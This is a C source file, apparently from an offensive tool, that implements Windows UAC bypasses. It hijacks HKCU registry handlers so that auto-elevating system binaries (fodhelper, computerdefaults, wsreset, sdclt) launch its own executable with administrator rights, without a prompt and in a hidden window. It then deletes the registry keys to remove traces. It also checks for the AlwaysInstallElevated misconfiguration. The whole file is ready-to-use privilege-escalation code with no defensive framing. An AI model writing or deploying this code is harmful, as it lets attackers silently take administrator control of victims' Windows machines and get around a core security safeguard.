#include "uac_bypass.h"
#include <shellapi.h>
#include <string.h>
#include <stdio.h>

/*
 * Shared helper: write registry key pointing to our binary, launch an
 * auto-elevate process that reads and executes it, wait for completion,
 * clean up registry, return whether an elevated child ran.
 *
 * Auto-elevate processes (fodhelper, computerdefaults, wsreset) honour
 * HKCU\Software\Classes\<handler>\shell\open\command without a UAC prompt
 * because they are marked as auto-elevate in their manifest.
 */
static bool reg_shellexec_bypass(
    const char* reg_key,
    const char* self_path,
    const char* process_name)
{
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)self_path, (DWORD)(strlen(self_path) + 1));
    /* DelegateExecute must exist (even empty) to trigger the handler */
    RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
    RegCloseKey(hKey);

    char proc_path[MAX_PATH];
    if (!GetSystemDirectoryA(proc_path, MAX_PATH)) {
        RegDeleteKeyA(HKEY_CURRENT_USER, reg_key);
        return false;
    }
    strncat(proc_path, "\\", MAX_PATH - strlen(proc_path) - 1);
    strncat(proc_path, process_name, MAX_PATH - strlen(proc_path) - 1);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize  = sizeof(sei);
    sei.fMask   = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;
    sei.lpVerb  = "open";
    sei.lpFile  = proc_path;
    sei.nShow   = SW_HIDE;
    BOOL launched = ShellExecuteExA(&sei);

    /* Give the auto-elevate process time to exec our binary */
    if (launched && sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 30000);
        CloseHandle(sei.hProcess);
    }

    /* Cleanup regardless of outcome */
    RegDeleteKeyA(HKEY_CURRENT_USER, reg_key);

    return launched != FALSE;
}

bool jocky_uac_bypass_fodhelper(const char* self_path) {
    return reg_shellexec_bypass(
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        self_path,
        "fodhelper.exe");
}

bool jocky_uac_bypass_computerdefaults(const char* self_path) {
    return reg_shellexec_bypass(
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        self_path,
        "computerdefaults.exe");
}

bool jocky_uac_bypass_wsreset(const char* self_path) {
    return reg_shellexec_bypass(
        "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command",
        self_path,
        "wsreset.exe");
}

bool jocky_uac_bypass_sdclt(const char* self_path) {
    /*
     * sdclt bypass: sets HKCU App Paths for control.exe, then invokes
     * sdclt.exe /KickOffElev which auto-elevates and calls control.exe.
     */
    const char* reg_key =
        "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe";

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (const BYTE*)self_path, (DWORD)(strlen(self_path) + 1));
    RegCloseKey(hKey);

    char proc_path[MAX_PATH];
    if (!GetSystemDirectoryA(proc_path, MAX_PATH)) {
        RegDeleteKeyA(HKEY_CURRENT_USER, reg_key);
        return false;
    }
    strncat(proc_path, "\\sdclt.exe", MAX_PATH - strlen(proc_path) - 1);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize      = sizeof(sei);
    sei.fMask       = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NO_CONSOLE;
    sei.lpVerb      = "open";
    sei.lpFile      = proc_path;
    sei.lpParameters = "/KickOffElev";
    sei.nShow       = SW_HIDE;
    BOOL launched = ShellExecuteExA(&sei);

    if (launched && sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 30000);
        CloseHandle(sei.hProcess);
    }

    RegDeleteKeyA(HKEY_CURRENT_USER, reg_key);
    return launched != FALSE;
}

bool jocky_check_always_install_elevated(void) {
    DWORD val = 0, size = sizeof(val);
    HKEY hKey;

    bool hklm_set = false, hkcu_set = false;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                (LPBYTE)&val, &size) == ERROR_SUCCESS && val == 1)
            hklm_set = true;
        RegCloseKey(hKey);
    }

    val = 0; size = sizeof(val);
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
                (LPBYTE)&val, &size) == ERROR_SUCCESS && val == 1)
            hkcu_set = true;
        RegCloseKey(hKey);
    }

    return hklm_set && hkcu_set;
}

bool jocky_uac_bypass(void) {
    char self_path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, self_path, MAX_PATH))
        return false;

    if (jocky_uac_bypass_fodhelper(self_path))       return true;
    if (jocky_uac_bypass_computerdefaults(self_path)) return true;
    if (jocky_uac_bypass_wsreset(self_path))          return true;
    if (jocky_uac_bypass_sdclt(self_path))            return true;
    return false;
}
